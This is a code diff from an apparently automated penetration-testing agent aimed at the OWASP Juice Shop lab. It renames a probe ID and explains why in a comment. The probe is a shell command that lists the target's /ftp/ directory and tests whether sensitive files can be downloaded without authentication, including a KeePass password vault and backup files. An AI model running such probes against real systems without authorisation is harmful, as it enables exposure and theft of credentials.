@@ -983,9 +983,16 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
     // registered test account in scope), SSRF/Gravatar (needs an authed
     // session the driver does not hold), RCE (no grounded vector in this lab).
     // Revisit only if recon discovers new endpoints.
-    if (!plansMention(/\/ftp|lfi|path.?traversal|directory.?list|backup.?file|sensitive.?file|kdbx/i) && !detRun.has('ftp-lfi-backup')) {
+    // NOTE (19 Oct 2026, elite-gap cycle) — detId encodes the probe's PREMISE
+    // version, not just its name: solver #125 corrected this probe from the
+    // wrong null-byte-.bak premise ('ftp-lfi-backup', already fired and
+    // correctly assessed as a true negative) to the verified kdbx-exposure
+    // premise. The old detId must NOT be reused, or the once-per-hunt flag
+    // silently kills the corrected probe on the current hunt. New premise
+    // → new detId ('ftp-kdbx-exposure'); validators untouched.
+    if (!plansMention(/\/ftp|lfi|path.?traversal|directory.?list|backup.?file|sensitive.?file|kdbx/i) && !detRun.has('ftp-kdbx-exposure')) {
       detFront.push({
-        detId: 'ftp-lfi-backup',
+        detId: 'ftp-kdbx-exposure',
         test: 'FTP directory listing + sensitive file exposure',
         command: `{ echo '--- /ftp/ listing (files) ---'; curl -sk "${baseUrl}/ftp/" | grep -o 'href="[^"]*"'; echo '--- sensitive file retrievability (http status, bytes) ---'; for f in incident-support.kdbx eastere.gg encrypt.pyc package.json.bak coupons_2013.md.bak suspicious_errors.yml; do printf "%s: " "$f"; curl -sk -o /dev/null -w "%{http_code} %{size_download}b" "${baseUrl}/ftp/$f"; echo; done; }`,
         why: 'Juice Shop exposes an unauthenticated /ftp directory listing; incident-support.kdbx (KeePass password vault, 3246 bytes, KDBX magic) downloads with HTTP 200 and no auth — verified live against this lab container',
